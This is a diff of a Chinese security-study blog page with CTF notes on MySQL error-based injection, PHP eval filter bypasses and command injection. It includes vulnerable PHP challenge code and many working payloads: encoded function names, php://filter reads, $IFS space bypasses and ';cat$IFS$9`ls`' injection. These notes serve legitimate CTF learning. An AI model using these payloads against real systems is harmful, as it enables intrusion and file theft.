@@ -71,9 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Web/注入漏洞/SQL注入/Mysql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/命令注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -83,215 +83,30 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h1 id="Mysql学习"><a href="#Mysql学习" class="headerlink" title="Mysql学习"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45173404/article/details/115712758">Mysql学习</a></h1><h1 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h1><p><span data-type="text" style="color: var(--b3-font-color12);">SHOW DATABASES;</span></p>
-<p>‍</p>
-<h1 id="查看某一个数据库里所有的表"><a href="#查看某一个数据库里所有的表" class="headerlink" title="查看某一个数据库里所有的表"></a>查看某一个数据库里所有的表</h1><p><span data-type="text" style="color: var(--b3-font-color12);">USE databasename;</span></p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">USE mysql;</span></p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SHOW TABLES;</span></p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SHOW TABLES FROM mysql;</span></p>
-<p>‍</p>
-<h1 id="select函数"><a href="#select函数" class="headerlink" title="select函数"></a>select函数</h1><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT NOW();</span>   – 查看当前时间</p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">use information_schema;</span></p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT DATABASE</span></p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT VERSION(); </span>– 查看版本</p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT USER();</span> – 查看当前登录数据库的用户</p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@datadir;</span> – 查看数据路径</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@basedir;</span> – 查看mysql安装路径</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT @@vesion_compile_os;</span> – 查看mysql安装的系统</p>
-<p>‍</p>
-<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM mysql.user;</span> – SELECT 查询关键字     #  ***** 代表所有</p>
-<p><span data-type="text" style="color: var(--b3-font-color8);">eg:</span> <span data-type="text" style="color: var(--b3-font-color9);">SELECT USER,HOST FROM mysql.user;</span></p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT schema_name FROM information_schema.’SCHEMATA’;</span></p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM information.tables;	</span></p>
-<h2 id="where-相当于编程语言里面的if"><a href="#where-相当于编程语言里面的if" class="headerlink" title="where 相当于编程语言里面的if"></a>where 相当于编程语言里面的if</h2><p><span data-type="text" style="color: var(--b3-font-color9);">SELECT USER,HOST FROM mysql.user WHERE USER &#x3D; ‘root’;</span> – mysql里面都是单引号</p>
-<h2 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h2><p><span data-type="text" style="color: var(--b3-font-color12);">CREATE DATABASE test CHARSET utf8mb4;</span></p>
-<h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">CREATE TABLE t1(id INT);</span></p>
-<p>DROP TABLE t1;</p>
-<p>‍</p>
-<p>SHOW TABLES FROM test;</p>
-<p>ALTER TABLE t1 ADD NAME VARCHAR(32);</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">DESC t1;</span></p>
-<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>INSERT INTO t1 VALUES (1,”张三”),(2,”李四”),(3,”王五”)</p>
-<p>SELECT * FROM t1;</p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT DATABASE();</span></p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM information_schema.tables WHERE table_schema &#x3D;’test’;</span> – 传库名</p>
-<p>‍</p>
-<p>‍</p>
-<p><span data-type="text" style="color: var(--b3-font-color12);">SELECT * FROM test.t1 WHERE NAME &#x3D; ‘张三’ AND id &#x3D; 1 ;</span></p>
-<p>‍</p>
-<h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p>SELECT * FROM test.t1 UNION SELECT 1,2,3,4,5;</p>
-<p>SELECT USER,HOST FROM mysql.user UNION SELECT * FROM test.’t1’;</p>
-<p>‍</p>
-<p>（rand：生成0~1的随机数 floor向下取整）</p>
-<p>select * from users group by name;(将相同名字的分层一个组)</p>
-<p>select name,count(*) from users group by name;</p>
-<p>在执行 group by name 语句时，MySQL 会在内部建立一个虚拟表，用来储存列的数据，表中会有一个 group 的 key 值作为表的主键，这里的主键就是用来分类的name列中获取的数据，当查询数据时，读取数据库数据，然后查看虚拟表中是否存在，不存在则插入新纪录，当读取到第一行数据时，发现name字段的admin不存在，将admin放入主键列中，1放在id列中;然后指针下移，继续读取数据表中的数据，读到第三行的 name 字段为 admin数据时，发现 admin 在虚拟表中已经存在，就汇总在一起，虚拟表如下如此循环，查询完所有的表后，虚拟表为如下所示，但是显示的结果在数据库中如下，因为以 name 分组，id 值取最前面一个，形成结果数据表显示出来</p>
-<p>select name,id from users group by name; 只取第一个出来</p>
-<p>当我们加上count(<em>)函数时，操作过程为:查看虚拟表是否存在该主键值，不存在则插入新记录，存在则count(</em>)字段直接加1，这样就能对上面的分类结果进行统计，然后将统计结果返回:</p>
-<p>select id,name,concat((select database()),0x7e,floor(rand(0)*2)) as a from users;</p>
-<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from users group by a ; **(此时group by的对象是a，a&#x3D;concat((select database()),0x7e,floor(rand(0)<em>2)),as a的意思也就是把前面的当作a为一个别名)</em>*</p>
-<blockquote>
-<p>第一次:<br>1:先查询虚拟表 有无a数据，比如第一次査询时为a&#x3D;sqli<del>0(也有可能是其他值)<br>2:查询无对应的数据，执行插入操作，插入时该语句再次执行，比如此时a&#x3D;sqli</del>0(也有可能是其他值)</p>
-</blockquote>
-<blockquote>
-<p>第二次:<br>1.先查询虚拟表 有无a数据，比如第二次查询时还是a&#x3D;sqli~01:<br>2:查询无对应的数据，执行插入操作，插入时该语句再次执行，比如插入时，此时a&#x3D;sqli-0，执行insert操作就会报错，因为key主键对应的列内容不允许重复</p>
-</blockquote>
-<p>当随机到相同的0或者1key键值的时候就会报错就会把这个爆出来</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/Mysql/" data-id="cmawal1j9001ybo7kdkww5hyp" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/绕过/指令绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="指令绕过"><a href="#指令绕过" class="headerlink" title="指令绕过"></a>指令绕过</h1><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>只要满足正则表达式中的，这串代码将进行eval($c)，eval这个函数会将字符串当作php代码执行</p>
-</blockquote>
-<blockquote>
-<p>方法一：?c&#x3D;system(‘cat config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法二：?c&#x3D;echo shell_exec(‘cat config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法三：?c&#x3D;highlight_file(‘config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法四：?c&#x3D;echo shell_exec(‘sed -n p config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法五：?c&#x3D;exec(‘cat config.php’, $output, $ret);echo ($output)[1];</p>
+        <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h1 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入"></a>什么是<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16930730.html">命令注入</a></h1><p>‍</p>
+<h3 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h3><blockquote>
+<p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）<br>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p>
 </blockquote>
 <p>‍</p>
-<h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>由于正则表达式改为不匹配了!preg_match，那么我们将不能用这三个函数，还可以用passthru这个函数，这个可以直接输出在浏览器上?c&#x3D;passthru(‘cat config.php’);,还有一个比较神奇的php为什么直接输出flag?c&#x3D;echo $flag;</p>
+<h3 id="命令绕过空格方法有："><a href="#命令绕过空格方法有：" class="headerlink" title="命令绕过空格方法有："></a>命令绕过空格方法有：</h3><blockquote>
+<p>${IFS}$9<br>{IFS}<br>$IFS<br>${IFS}<br>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行<br>IFS<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来<br>%20   (space)<br>%09   (tab)<br>X&#x3D;$’cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）</p>
 </blockquote>
 <blockquote>
-<p>方法一：</p>
-<p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 因此可以构造linux命令输出config.php文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac config.php`;</span><br></pre></td></tr></table></figure>
-
-<p>tac命令倒序输出文件，在页面就能看到结果flag。 如果用cat命令，正序输出，因为被认为是PHP文件，所以需要在F12网络请求里看响应。还可以用这个函数得到内容c&#x3D;echo file_get_contents(‘config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法二：php伪协议读取文件?c&#x3D;include(‘php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php’); 直接查看源码</p>
-<p>?c=show_source(‘config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法三：print_r();可以使用，?c=print_r(get_defined_vars()); 在数组中取出当前已定义的变量，本来是想传参到post绕过get的过滤机制system的，但是取出定义参数的时候，被定义好的flag参数也顺带被取出来了。</p>
-</blockquote>
-<blockquote>
-<p>方法四：拼接绕过，限制函数system，构造?c=$a=‘sys’;$b=‘tem’;$d=$a.$b;$d(‘cat config.php’);</p>
-</blockquote>
-<blockquote>
-<p>方法五：可以用get方式:?c=echo $_GET[1];&amp;1=tac config.php<br>可以用post方式:?c=echo $_POST[1];然后在Post data中写入1=tac config.php</p>
-</blockquote>
-<blockquote>
-<p>方法六：使用或运算模式绕过限制，F12查看源码?c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%03%0f%0e%06%09%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%60%60%2e%60%60%60”);</p>
+<p>ps:有时会禁用cat:<br>解决方法是使用tac反向输出命令：<br>linux命令中可以加\，所以甚至可以ca\t &#x2F;fl\ag</p>
 </blockquote>
 <p>‍</p>
-<h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>不难看出，这一次仅用了cat命令，‘.’和php还有config，那么我们就要想办法绕过才行，符号*有猜测的作用</p>
-</blockquote>
-<blockquote>
-<p>可以用*符号来猜测补全不用完整的congfig和php，还有可以用tac不用cat就行，，system被禁用，老样子我们用passthru，还可以用print_r</p>
-</blockquote>
-<blockquote>
-<p>另类的解题方法 根据报错获得路径信息&#x2F;var&#x2F;www&#x2F;html c&#x3D;$a&#x3D;opendir(%27&#x2F;var&#x2F;www&#x2F;html%27);$e&#x3D;readdir($a);$e&#x3D;readdir($a);$e&#x3D;readdir($a);echo%20readfile($e);</p>
-</blockquote>
-<blockquote>
-<p>可以用base64编码来绕过c&#x3D;$a&#x3D;base64_decode(‘c3lzdGVt’);$b&#x3D;base64_decode(‘Y2F0IGNvbmZpZy5waHA&#x3D;’);$a($b);</p>
-</blockquote>
-<blockquote>
-<p>cat 还有 less more head tac tali</p>
-</blockquote>
 <p>‍</p>
-<h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>发现居然连分号都禁用了，php中?&gt;闭合了前面的<?，代表代码结束，因此最后一行是可以不需要分号的 ②?c=passthru('tac c*')?></p>
-</blockquote>
-<blockquote>
-<p>通过伪协议获取 题目已经明确告知答案在config.php payload: &#x2F;?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</p>
-</blockquote>
-<p>‍</p>
-<h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>发现这一次有点离谱，居然把小括号给引用了，那么有一些函数就用不了了，不过我们要记住php中&#96;&#96;直接代表指令</p>
-</blockquote>
-<blockquote>
-<p>那么我们就不用（）的函数，我们使用	?c&#x3D;echo `tac con*`?&gt;</p>
-</blockquote>
-<blockquote>
-<p>也可以直接echo找到flag</p>
-</blockquote>
-<blockquote>
-<p>当然还可以用伪协议</p>
-<p>涉及到一个php的代码结构，<?php $_GET[a];?>…..②payload为：?c&#x3D;include $_GET[a]?&gt;，等同于<?php include $_GET[a]?>，php的最后一行代码可以省去分号…..③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php④因此连起来构造的payload为：</p>
-</blockquote>
-<blockquote>
-<p>也可以&#x2F;?c&#x3D;echo <code>$_GET[a]</code>​?&gt;&amp;a&#x3D;cat config.php 让其echo一个get请求，?&gt;闭合，请求内容为cat config.php</p>
-</blockquote>
-<p>‍</p>
-<h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>新增了*，？，&lt;&gt;，&#x3D;的过滤，这样就不能用?&gt;结尾了，</p>
-</blockquote>
-<blockquote>
-<p>但是还可以可以用get和post,?c&#x3D;echo`$_GET[1]`;&amp;1&#x3D;tac “config.php”</p>
-</blockquote>
-<blockquote>
-<p>?c&#x3D;echo <code>$_POST[a]</code>​; BP 截断，修改为POST, 增加参数 a&#x3D; cat config.php</p>
-</blockquote>
-<blockquote>
-<p>只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?c&#x3D;echo <code>tac confi[g][!0-9]ph[p]</code>​;</p>
-</blockquote>
-<blockquote>
-<p>?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_REQUEST[a]</code>​; ?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_GET[a]</code>​; 解析：php语言中，使用get、post传参，参数保存在超级变量$_REQUEST[a]、$_POST[a]、$_REQUEST[a]中。我们向REQUEST[a]传入文件名（因为如果写入c，会被过滤），然后向c传入执行_REQUEST[a]的代码。 另外，我们也可以通过burp抓包，以post方法将变量传入到a；通过get方法，向c传入执行代码。</p>
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​</p>
+<p>$IFS在Linux下表示为空格<br>$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</p>
+<p>这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用</p>
 </blockquote>
 <p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/" data-id="cmawal1j90020bo7kedzv30y4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" data-id="cmawcfx9h002jcg7k4wy44fky" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -393,7 +208,50 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/" data-id="cmawal1ja0022bo7kat68gwkd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/" data-id="cmawcfx9h002kcg7k44diaf0t" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/%00截断" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 